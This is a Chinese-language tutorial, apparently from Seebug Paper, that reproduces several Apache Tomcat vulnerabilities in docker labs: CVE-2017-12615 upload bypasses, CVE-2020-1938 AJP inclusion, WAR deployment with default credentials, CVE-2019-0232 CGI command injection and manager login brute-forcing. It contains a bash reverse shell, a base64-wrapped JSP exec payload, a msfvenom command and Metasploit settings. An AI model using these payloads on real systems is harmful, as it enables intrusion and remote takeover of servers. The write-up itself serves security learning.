**作者：mathwizard  
原文链接：<https://mp.weixin.qq.com/s/rqnk7OOkHbub5zeuFFmJ3g> **

## 简介

Tomcat是Apache 软件基金会（Apache Software Foundation）的Jakarta 项目中的一个核心项目，由Apache、Sun
和其他一些公司及个人共同开发而成。由于有了Sun 的参与和支持，最新的Servlet 和JSP 规范总是能在Tomcat 中得到体现，Tomcat
5支持最新的Servlet 2.4 和JSP 2.0 规范。因为Tomcat 技术先进、性能稳定，而且免费，因而深受Java
爱好者的喜爱并得到了部分软件开发商的认可，成为目前比较流行的Web 应用服务器。

Tomcat 服务器是一个免费的开放源代码的Web
应用服务器，属于轻量级应用服务器，在中小型系统和并发访问用户不是很多的场合下被普遍使用，是开发和调试JSP
程序的首选。对于一个初学者来说，可以这样认为，当在一台机器上配置好Apache
服务器，可利用它响应HTML（标准通用标记语言下的一个应用）页面的访问请求。实际上Tomcat是Apache
服务器的扩展，但运行时它是独立运行的，所以当你运行tomcat 时，它实际上作为一个与Apache 独立的进程单独运行的。

诀窍是，当配置正确时，Apache 为HTML页面服务，而Tomcat 实际上运行JSP
页面和Servlet。另外，Tomcat和IIS等Web服务器一样，具有处理HTML页面的功能，另外它还是一个Servlet和JSP容器，独立的Servlet容器是Tomcat的默认模式。不过，Tomcat处理静态HTML的能力不如Apache服务器。目前Tomcat最新版本为10.0.5。

## CVE-2017-12615

CVE-2017-12615对应的漏洞为任意文件写入，主要影响的是Tomcat的7.0.0-7.0.81这几个版本

### 漏洞原理

由于配置不当（非默认配置），将配置文件`conf/web.xml`中的`readonly`设置为了
false，导致可以使用PUT方法上传任意文件，但限制了jsp后缀的上传

根据描述，在 Windows 服务器下，将 readonly 参数设置为 false 时，即可通过 PUT 方式创建一个 JSP 文件，并可以执行任意代码

通过阅读 conf/web.xml 文件，可以发现，默认 readonly 为 true，当 readonly 设置为 false 时，可以通过 PUT /
DELETE 进行文件操控

### 漏洞复现

这里使用vuluhub的docker进行漏洞复现，这里就不详细介绍环境搭建了

首先进入CVE-2017-12615的docker环境

    
    
    sudo docker-compose up -ddocker ps    //查看docker环境是否启动成功

![](https://images.seebug.org/content/images/2021/08/fe3866da-5a0c-49da-b27d-5c5316d6475f.jpg-w331s)

这里首先进入docker里查看一下`web.xml`的代码，可以看到这里`readonly`设置为`false`，所以存在漏洞

    
    
    sudo docker exec -ti ec bash    //进入docker容器cat conf/web.xml | grep readonly

![](https://images.seebug.org/content/images/2021/08/48d1cfdd-a2f0-41b2-abb4-3ba1d819bed2.jpg-w331s)
访问下8080端口，对应的是`Tomcat 8.5.19`

![](https://images.seebug.org/content/images/2021/08/0a443e6a-04b9-4732-a822-605f58fab51c.jpg-w331s)

在8080端口进行抓包，这里发现是一个`GET`方法

![](https://images.seebug.org/content/images/2021/08/d046f15a-133e-4e11-aca7-375a44e2ee73.jpg-w331s)

这里首先测试一下，改为`PUT`方法写入一个`test.txt`，这里看到返回201，应该已经上传成功了

    
    
    PUT /test.txt HTTP/1.1testpoc

![](https://images.seebug.org/content/images/2021/08/fa55a62e-72de-42df-b910-c9f7e7624589.jpg-w331s)

这里进入docker查看一下已经写入成功了

    
    
    cd /usr/local/tomcat/webapps/ROOTls

![](https://images.seebug.org/content/images/2021/08/71830790-046e-4c25-b038-74d286fcd9c5.jpg-w331s)

之前说过，使用PUT方法上传任意文件，但限制了jsp后缀的上传，这里首先使用PUT方法直接上传一个冰蝎的jsp上去，发现返回的是404，应该是被拦截了

![](https://images.seebug.org/content/images/2021/08/5075348a-1504-492d-91ef-330d1b6b7067.jpg-w331s)

这里就需要进行绕过，这里绕过有三种方法

    
    
    1.Windows下不允许文件以空格结尾以PUT /a001.jsp%20 HTTP/1.1上传到 Windows会被自动去掉末尾空格  
    2.Windows NTFS流Put/a001.jsp::$DATA HTTP/1.1  
    3. /在文件名中是非法的，也会被去除（Linux/Windows）Put/a001.jsp/http:/1.1  

首先使用`%20`绕过。我们知道`%20`对应的是空格，在windows中若文件这里在jsp后面添加`%20`即可达到自动抹去空格的效果。这里看到返回201已经上传成功了

![](https://images.seebug.org/content/images/2021/08/bc7e0776-7c51-4bcd-9d8b-a09c4dbe8142.jpg-w331s)

进入docker查看一下，确认是上传上去了

![](https://images.seebug.org/content/images/2021/08/404620fd-ce34-4c6f-b0d7-de882b321dd5.jpg-w331s)

第二种方法为在jsp后缀后面使用`/`，因为`/`在文件名中是非法的，在windows和linux中都会自动去除。根据这个特性，上传`/ice1.jsp/`，看到返回201

![](https://images.seebug.org/content/images/2021/08/fe0f8b5c-deea-4146-8fde-60308cfb6e94.jpg-w331s)

进入docker查看发现已经上传成功

![](https://images.seebug.org/content/images/2021/08/83b518f2-1ee6-4e16-86af-2429ada717d1.jpg-w331s)

第三种方法就是使用Windows NTFS流，在jsp后面添加`::$DATA`，看到返回201，上传成功

![](https://images.seebug.org/content/images/2021/08/6ff0020f-91ad-4ffd-98c6-c4ca87ed2720.jpg-w331s)

进入docker验证一下

![](https://images.seebug.org/content/images/2021/08/a27874ad-fd67-446c-afe2-9ab3bde1e45d.jpg-w331s)

这里随便连接一个jsp即可拿到webshell

![](https://images.seebug.org/content/images/2021/08/6c7cb389-9fe8-43b3-bd56-3ecf7632b3a1.jpg-w331s)

## CVE-2020-1938

CVE-2020-1938为Tomcat AJP文件包含漏洞。由长亭科技安全研究员发现的存在于 Tomcat中的安全漏洞，由于 Tomcat
AJP协议设计上存在缺陷，攻击者通过 Tomcat AJP Connector可以读取或包含 Tomcat上所有 webapp目录下的任意文件，例如可以读取
webapp配置文件或源码。

此外在目标应用有文件上传功能的情况下，配合文件包含的利用还可以达到远程代码执行的危害。

### 漏洞原理

Tomcat 配置了两个Connecto，它们分别是 HTTP 和 AJP
：HTTP默认端口为8080，处理http请求，而AJP默认端口8009，用于处理 AJP
协议的请求，而AJP比http更加优化，多用于反向、集群等，漏洞由于Tomcat
AJP协议存在缺陷而导致，攻击者利用该漏洞可通过构造特定参数，读取服务器webapp下的任意文件以及可以包含任意文件，如果有某上传点，上传图片马等等，即可以获取shell

tomcat默认的conf/server.xml中配置了2个Connector，一个为8080的对外提供的HTTP协议端口，另外一个就是默认的8009
AJP协议端口，两个端口默认均监听在外网ip。

![](https://images.seebug.org/content/images/2021/08/6c194057-e428-4ccc-9bb0-1ebc29c21388.jpg-w331s)
tomcat在接收ajp请求的时候调用org.apache.coyote.ajp.AjpProcessor来处理ajp消息，prepareRequest将ajp里面的内容取出来设置成request对象的Attribute属性

![](https://images.seebug.org/content/images/2021/08/78689429-242e-4023-99ca-de6ca966be33.jpg-w331s)

因此可以通过此种特性从而可以控制request对象的下面三个Attribute属性

    
    
    javax.servlet.include.request_uri  
    javax.servlet.include.path_info  
    javax.servlet.include.servlet_path  

然后封装成对应的request之后,继续走servlet的映射流程如下

![](https://images.seebug.org/content/images/2021/08/c5a7fa5e-42d2-402a-ada5-bbd29cb4b3b8.jpg-w331s)

### 漏洞复现

启动CVE-2020-1938的docker环境
![](https://images.seebug.org/content/images/2021/08/f2f3f0f4-daa7-4011-a20d-027818c8ab77.jpg-w331s)

首先使用poc进行漏洞检测，若存在漏洞则可以查看webapps目录下的所有文件

    
    
    git clone https://github.com/YDHCUI/CNVD-2020-10487-Tomcat-Ajp-lfi  
    cd CNVD-2020-10487-Tomcat-Ajp-lfi  
    python CNVD-2020-10487-Tomcat-Ajp-lfi.py    #py2环境  

![](https://images.seebug.org/content/images/2021/08/5b666c68-3da3-430c-bc0d-3c79b7e48961.jpg-w331s)

这里查看8009端口下的`web.xml`文件

    
    
    python CNVD-2020-10487-Tomcat-Ajp-lfi.py 192.168.1.8 -p 8009 -f /WEB-INF/web.xml

![](https://images.seebug.org/content/images/2021/08/5fad7ad8-b06c-4e72-9726-e654d7d619ae.jpg-w331s)

使用bash反弹shell

    
    
    bash -i >& /dev/tcp/192.168.1.8/8888 0>&1

因为是java的原因所以需要转换一下，使用http://www.jackson-t.ca/runtime-exec-payloads.html，转换结果如下

    
    
    bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjEuOC84ODg4IDA+JjE=}|{base64,-d}|{bash,-i}

生成一个`test.txt`，这里只需要换payload就可以

    
    
    <%    java.io.InputStream in = Runtime.getRuntime().exec("bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjEuOC84ODg4IDA+JjE=}|{base64,-d}|{bash,-i}").getInputStream();    int a = -1;    byte[] b = new byte[2048];    out.print("<pre>");    while((a=in.read(b))!=-1){        out.println(new String(b));    }    out.print("</pre>");%>

bp抓包把`test.txt`上传到docker容器

![](https://images.seebug.org/content/images/2021/08/f2f336af-c467-46e0-b082-354e31dd0da2.jpg-w331s)
nc开启端口监听

![](https://images.seebug.org/content/images/2021/08/7527662b-7abc-4f60-9cff-ad9cea9f50c6.jpg-w331s)

即可获得一个交互型shell

    
    
    python CNVD-2020-10487-Tomcat-Ajp-lfi.py 192.168.1.8 -p 8009 -f test.txt

![](https://images.seebug.org/content/images/2021/08/cf94d9e0-cc4d-4bc9-bc0c-79370fb83ecb.jpg-w331s)

这里为了方便，上线到msf上进行操作，首先生成一个`shell.txt`

    
    
    msfvenom -p java/jsp_shell_reverse_tcp LHOST=192.168.1.10 LPORT=4444 R > shell.txt

![](https://images.seebug.org/content/images/2021/08/90f80a73-b65f-4e80-a54b-15b09a05f7e7.jpg-w331s)

抓包将`shell.txt`上传到docker

![](https://images.seebug.org/content/images/2021/08/c681b1f5-9214-40b7-9137-d6dd1972a9a0.jpg-w331s)

msf开启监听，注意payload使用`java/jsp_shell_reverse_tcp`

![](https://images.seebug.org/content/images/2021/08/413f239c-d97e-4dca-b7fb-d2729542f935.jpg-w331s)

再使用poc反弹即可上线

    
    
    python CNVD-2020-10487-Tomcat-Ajp-lfi.py 192.168.1.8 -p 8009 -f shell.txt

![](https://images.seebug.org/content/images/2021/08/e74e890e-72b7-4a7e-9410-fec48e56c85f.jpg-w331s)

## 弱口令&war远程部署

### 漏洞原理

在tomcat8环境下默认进入后台的密码为tomcat/tomcat，未修改造成未授权即可进入后台

### 漏洞复现

进入`tomcat8`的docker环境

![](https://images.seebug.org/content/images/2021/08/7e2e5e2d-7883-40f0-afb7-92d637438877.jpg-w331s)

访问后台管理地址，使用tomcat/tomcat进入后台

    
    
    http://192.168.1.8:8080//manager/html

![](https://images.seebug.org/content/images/2021/08/94ba29bf-67be-41c1-a1b9-3503f762c210.jpg-w331s)

进入到了后台的页面

![](https://images.seebug.org/content/images/2021/08/f967fa82-db2b-4343-b458-fd3f2d62caf9.jpg-w331s)

看到这里有一个上传war包的地方，这里很多java的中间件都可以用war远程部署来拿shell，tomcat也不例外

![](https://images.seebug.org/content/images/2021/08/07b7f704-f5a7-4697-9acf-127c28e49cb2.jpg-w331s)

首先将ice.jsp打包成test.war

    
    
    jar -cvf test.war .

![](https://images.seebug.org/content/images/2021/08/dbd2e326-ee99-43bb-8754-e7b7043bcb3b.jpg-w331s)

点击上传即可看到上传的test.war已经部署成功

![](https://images.seebug.org/content/images/2021/08/bc190176-7895-49dc-8bd4-4e68611aae25.jpg-w331s)

访问一下没有报错404那么应该已经上传成功

![](https://images.seebug.org/content/images/2021/08/d353bde6-6bde-4164-b9a6-b0a7627c8234.jpg-w331s)

使用冰蝎连接即可得到shell

![](https://images.seebug.org/content/images/2021/08/28d362bd-38a6-41c2-886f-cfb96d90f3e1.jpg-w331s)
这里也可以用msf里面的`exploit/multi/http/tomcat_mgr_upload`模块

    
    
    use exploit/multi/http/tomcat_mgr_uploadset HttpPassword tomcatset HttpUsername tomcatset rhost 192.168.1.8set rport 8080run

![](https://images.seebug.org/content/images/2021/08/e3bce580-1b6a-423f-b61c-f4b5255ca61c.jpg-w331s)

运行即可得到一个meterpreter

![](https://images.seebug.org/content/images/2021/08/64526eea-bc29-4fc7-bd9c-d42dadf3fcd9.jpg-w331s)

## CVE-2019-0232

CVE-2019-0232为Apache Tomcat RCE

### 漏洞原理

漏洞相关的代码在 tomcat\java\org\apache\catalina\servlets\CGIServlet.java
中，CGIServlet提供了一个cgi的调用接口，在启用 enableCmdLineArguments 参数时，会根据RFC
3875来从Url参数中生成命令行参数，并把参数传递至Java的 Runtime 执行。这个漏洞是因为 Runtime.getRuntime().exec
在Windows中和Linux中底层实现不同导致的

Java的 `Runtime.getRuntime().exec` 在CGI调用这种情况下很难有命令注入。而Windows中创建进程使用的是
`CreateProcess` ，会将参数合并成字符串，作为 `lpComandLine` 传入 `CreateProcess` 。程序启动后调用
`GetCommandLine` 获取参数，并调用 `CommandLineToArgvW` 传至 argv。在Windows中，当
`CreateProcess` 中的参数为 bat 文件或是 cmd 文件时，会调用 `cmd.exe` , 故最后会变成 `cmd.exe /c
"arg.bat & dir"`，而Java的调用过程并没有做任何的转义，所以在Windows下会存在漏洞

### 漏洞复现

启动tomcat

![](https://images.seebug.org/content/images/2021/08/39f9b97e-60d7-46ce-a14d-441fe5a53e9a.jpg-w331s)
访问一下已经启动成功

![](https://images.seebug.org/content/images/2021/08/cd89d71b-e88a-42c3-a14f-1561dee607d9.jpg-w331s)

Tomcat的 CGI_Servlet组件默认是关闭的，在`conf/web.xml`中找到注释的
CGIServlet部分，去掉注释，并配置enableCmdLineArguments和executable

![](https://images.seebug.org/content/images/2021/08/16f92091-89ef-47de-8b2c-c72960e287ee.jpg-w331s)

这里注意一下，去掉注释并添加以下代码

    
    
    enableCmdLineArguments启用后才会将Url中的参数传递到命令行executable指定了执行的二进制文件，默认是perl，需要置为空才会执行文件本身。
        <init-param>        <param-name>enableCmdLineArguments</param-name>        <param-value>true</param-value>    </init-param>    <init-param>        <param-name>executable</param-name>        <param-value></param-value>    </init-param>

![](https://images.seebug.org/content/images/2021/08/cd3bbf46-143a-4e41-a1ce-b6d7fb517be0.jpg-w331s)

然后在conf/web.xml中启用cgi的 servlet-mapping

![](https://images.seebug.org/content/images/2021/08/44d47e07-bdab-4357-ac03-53bad97e50c6.jpg-w331s)

修改conf/context.xml的添加 privileged="true"属性，否则会没有权限

![](https://images.seebug.org/content/images/2021/08/2b81cd9f-ec51-4b91-9ee4-3ec631c3899e.jpg-w331s)

添加true

    
    
    <Context privileged="true">

![](https://images.seebug.org/content/images/2021/08/58bef511-4bda-4054-b55f-b60ff227ab6b.jpg-w331s)
在`C:\Tomcat\webapps\ROOT\WEB-INF`下创建`cgi-bin`目录

![](https://images.seebug.org/content/images/2021/08/3bd2b1a8-f302-4b08-a72f-43ef3276d518.jpg-w331s)

在该目录下创建一个hello.bat

![](https://images.seebug.org/content/images/2021/08/68f04de8-1f6f-4ce9-9f0f-61a4746528cc.jpg-w331s)

然后重启tomcat环境

![](https://images.seebug.org/content/images/2021/08/315c360b-b98e-4147-88f4-53f8ea4b108a.jpg-w331s)

访问`http://localhost:8080/cgi-bin/hello.bat?&C%3A%5CWindows%5CSystem32%5Ccalc.exe`即可弹出计算器，这里构造系统命令即可

![](https://images.seebug.org/content/images/2021/08/32f136ce-b178-4465-8036-545d80142b12.jpg-w331s)

## manager App暴力破解

### 漏洞原理

后台密码用base64编码传输，抓包解密即可得到后台密码，也可以进行爆破

### 漏洞复现

这里访问`http://192.168.1.8:8000/manager/html`进行抓包，在没有输入帐号密码的时候是没有什么数据的

![](https://images.seebug.org/content/images/2021/08/c737ce47-fe74-4979-98a4-f4ec915f8e2f.jpg-w331s)

把这个包放过去，会请求输入用户名和密码，再进行抓包
![](https://images.seebug.org/content/images/2021/08/7a583029-00ea-478a-813b-a2b94b9c0b19.jpg-w331s)

就可以得到`Authorization`这个字段，这个字段有一个`Basic`，就是base64加密的意思

![](https://images.seebug.org/content/images/2021/08/6c22d3a4-add7-4eaf-b8fa-c1de143ebd89.jpg-w331s)

这里直接放到base64解密得到`tomcat:tomcat`的密码

![](https://images.seebug.org/content/images/2021/08/b15c954e-da4d-4f93-a318-559247d3d786.jpg-w331s)

进入后台之后再次抓包可以看到有一个cookie，但是没有了`Authorization`这个字段

![](https://images.seebug.org/content/images/2021/08/403d8ebd-8bf3-460b-b038-476e0d8e6f71.jpg-w331s)

我们可以对字段进行爆破，加上`Authorization`即可

![](https://images.seebug.org/content/images/2021/08/99113755-5829-478f-ac11-d23eec92b7c6.jpg-w331s)

去掉自带的编码

![](https://images.seebug.org/content/images/2021/08/a9572633-068e-40cc-908e-98039e9be397.jpg-w331s)
攻击即可拿到账号密码

![](https://images.seebug.org/content/images/2021/08/4ea4d73f-aa8d-4789-9b68-d702f805fb0d.jpg-w331s)

* * *

![Paper](https://images.seebug.org/content/images/2017/08/0e69b04c-e31f-4884-8091-24ec334fbd7e.jpeg)
本文由 Seebug Paper 发布，如需转载请注明来源。本文地址：<https://paper.seebug.org/1677/>

